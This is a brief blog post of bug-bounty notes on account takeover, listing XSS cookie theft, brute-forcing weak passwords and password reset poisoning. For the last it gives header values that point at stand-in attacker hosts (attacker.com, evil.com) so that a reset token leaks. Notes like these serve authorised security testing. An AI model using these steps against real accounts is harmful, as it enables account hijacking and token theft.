---
title: Notes for HowToHunt.md
toc: true
date: 2021-04-08 16:05:57
categories: [Cyber security, Bug bounty]
---

## ACCOUNT TAKEOVER

1. Have a session hijacking -> Look for xss to stole the cookies n expand the impact
1. The target has weak password policy -> Create a (very) weak password n brute force this account to show the POC
1. Password reset poisoning:
    1. Go to password reset function -> Enter email n intercept
    2. Change host header to some other host i.e,
        * Host:target.com
        * Host:attacker.com
also try to add some headers without changing host like
        * X-Forwarded-Host: evil.com
        * Referrer: https ://evil.com
    2. Forward this if you found that in next request attacker.com means you successfully theft the token.:)
